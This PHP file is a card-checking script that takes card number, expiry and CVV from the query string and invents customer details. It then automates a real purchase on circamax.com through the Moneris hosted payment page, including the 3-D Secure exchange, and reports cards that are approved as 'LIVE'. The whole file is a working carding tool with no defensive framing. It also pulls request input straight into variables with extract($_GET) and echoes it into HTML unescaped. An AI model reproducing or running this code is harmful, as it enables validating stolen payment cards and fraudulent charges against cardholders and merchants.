<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $postcodes = file_get_contents('http://api.postcodes.io/random/postcodes');
    $getUkPostcode = json_decode($postcodes, true);
    $postcode = $getUkPostcode['result']['postcode'];
    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united%20states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $city = preg_split("/[\s,]+/", $data['street2'])[0];
    $state = preg_split("/[\s,]+/", $data['street2'])[1];
    $phone = str_replace("-", "", $data['phone']);
 
    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.circamax.com/?',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "target=cart&action=add&itemsList=XLite%5CView%5CForm%5CItemsList%5CAItemsListSearch&mode=search&product_id=156&category_id=42&returnURL=%2Fusb-2-0-a-b-beige-cable-3ft.html&target_widget=%5CXLite%5CModule%5CXC%5CReviews%5CView%5CCustomer%5CProductInfo%5CDetails%5CAverageRating&widgetMode=product-details&amount=1&target_widget=%5CXLite%5CModule%5CXC%5CReviews%5CView%5CCustomer%5CReviewsTab%5CAverageRating"
    ));
    $addToCart = curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.circamax.com/?target=checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $form_id = GetStr(curl_exec($ch), "form_id: '", "'");
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.circamax.com/?',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'content-type: application/x-www-form-urlencoded',
            'Origin: https://www.circamax.com',
            'Referer: https://www.circamax.com/?target=checkout',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "target=checkout&action=update_profile&returnURL=%3Ftarget%3Dcheckout%26action%3Dupdate_profile%26xcart_form_id%3D$form_id&xcart_form_id=$form_id&shippingAddress%5Bfirstname%5D=$fname&shippingAddress%5Blastname%5D=$lname&shippingAddress%5Bstreet%5D=$street&shippingAddress%5Bcity%5D=Calgary&shippingAddress%5Bcountry_code%5D=CA&shippingAddress%5Bstate_id%5D=52&shippingAddress%5Bcustom_state%5D=Alber&shippingAddress%5Bzipcode%5D=T2E+6T4&shippingAddress%5Bphone%5D=%2B1$phone&email=$fname$lname@gmail.com&password="
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.circamax.com/?',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'origin: https://www.circamax.com',
            'referer: https://www.circamax.com/?target=checkout',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "target=checkout&action=checkout&xcart_form_id=$form_id&returnURL=%2F%3Ftarget%3Dcheckout&notes=&subscribeToAll="
    ));
    foreach(explode("<input type=\"hidden\"", GetStr(curl_exec($ch), '<fieldset style="display: none;">', "</fieldset>")) as $values){
        $form[GetStr($values, 'name="','"')] = GetStr($values, 'value="','"');
    }
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www3.moneris.com/HPPDP/index.php',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.circamax.com',
            'Referer: https://www.circamax.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => http_build_query($form)
    ));
    $getShits = curl_exec($ch);
    curl_close($ch);

    $hpp_id = GetStr($getShits, '"hpp_id=', '"');
    $hpp_ticket = GetStr($getShits, 'hpp_ticket=" + encodeURIComponent("', '"');

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www3.moneris.com/HPPDP/hprequest.php',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            'Origin: https://www3.moneris.com',
            'Referer: https://www3.moneris.com/HPPDP/index.php',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "hpp_id=$hpp_id&hpp_ticket=$hpp_ticket&pan=$cc&pan_mm=$mm&pan_yy=".substr($yy, 2, 4)."&cardholder=$fname $lname&doTransaction=cc_purchase"
    ));
    $oten = curl_exec($ch);
    curl_close($ch);

    $PaReqMd = GetStr(base64_decode(GetStr($oten, '"form":"', '"')), '<input type="hidden" name="MD" value="', '"');
    $acsurl = GetStr(base64_decode(GetStr($oten, '"form":"', '"')), 'name="downloadForm" action="', '"');
    foreach(explode("<input type=\"hidden\"", GetStr(base64_decode(GetStr($oten, '"form":"', '"')), '<form name="downloadForm" ', '</form>')) as $values){
        $preq[GetStr($values, 'name="','"')] = GetStr($values, 'value="','"');
    }

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $acsurl,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Origin: https://pay.realexpayments.com',
            'Referer: https://pay.realexpayments.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => http_build_query($preq)
    ));
    $pares = GetStr(curl_exec($ch), '<input type="hidden" name="PaRes" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www3.moneris.com/HPPDP/index.php',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://aacsw.3ds.verifiedbyvisa.com',
            'Referer: https://aacsw.3ds.verifiedbyvisa.com/',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "PaRes=".urlencode($pares)."&MD=".urlencode($PaReqMd)
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www3.moneris.com/HPPDP/hprequest.php',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: */*',
            'Content-Type: application/x-www-form-urlencoded;charset=UTF-8',
            'Origin: https://www3.moneris.com',
            'Referer: https://www3.moneris.com/HPPDP/index.php',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "hpp_id=$hpp_id&hpp_ticket=$hpp_ticket&doTransaction=cavv_purchase"
    ));
    $hppReq = base64_decode(curl_exec($ch));
    curl_close($ch);

    $response_code = GetStr($hppReq, 'id="response_code" value="', '"');
    $message = GetStr($hppReq, 'id="message" value="', '"');
    $charge_total = GetStr($hppReq, 'id="charge_total" value="', '"');

    if(strpos($hppReq, 'APPROVED')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">'.$response_code.': '.$message.' | Charge: $'.$charge_total.' CAD</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response_code.': '.$message.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>
